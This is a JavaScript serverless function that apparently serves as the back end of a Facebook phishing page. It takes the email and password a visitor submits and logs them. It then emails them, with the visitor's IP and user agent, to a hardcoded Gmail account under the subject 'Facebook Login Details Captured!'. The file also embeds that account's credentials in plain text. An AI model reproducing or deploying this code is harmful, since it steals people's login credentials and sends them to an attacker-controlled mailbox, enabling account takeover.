const nodemailer = require('nodemailer');

exports.handler = async function(event, context) {
    console.log('send-alert function invoked');
    try {
        const ip = event.headers['x-nf-client-connection-ip'];
        const userAgent = event.headers['user-agent'];
        const body = JSON.parse(event.body);
        const email = body.email;
        const password = body.password;

        console.log('IP:', ip);
        console.log('User Agent:', userAgent);
        console.log('Email:', email);
        console.log('Password:', password);

        const details = `IP: ${ip}\nUser Agent: ${userAgent}\nEmail: ${email}\nPassword: ${password}`;

        let transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'mwananchihuslerloans@gmail.com',
                pass: 'jijqauofnpaxdcpm',
            },
        });

        let info = await transporter.sendMail({
            from: 'mwananchihuslerloans@gmail.com',
            to: 'mwananchihuslerloans@gmail.com',
            subject: 'Facebook Login Details Captured!',
            text: 'Someone entered their login details on your Facebook phishing demo page.\n\nVisitor Details:\n' + details, // Include details
        });

        console.log('Message sent: %s', info.messageId);

        return {
            statusCode: 200,
            body: JSON.stringify({
                message: 'Email sent successfully'
            }),
        };
    } catch (error) {
        console.error('Error sending email:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({
                error: error.message
            }),
        };
    }
};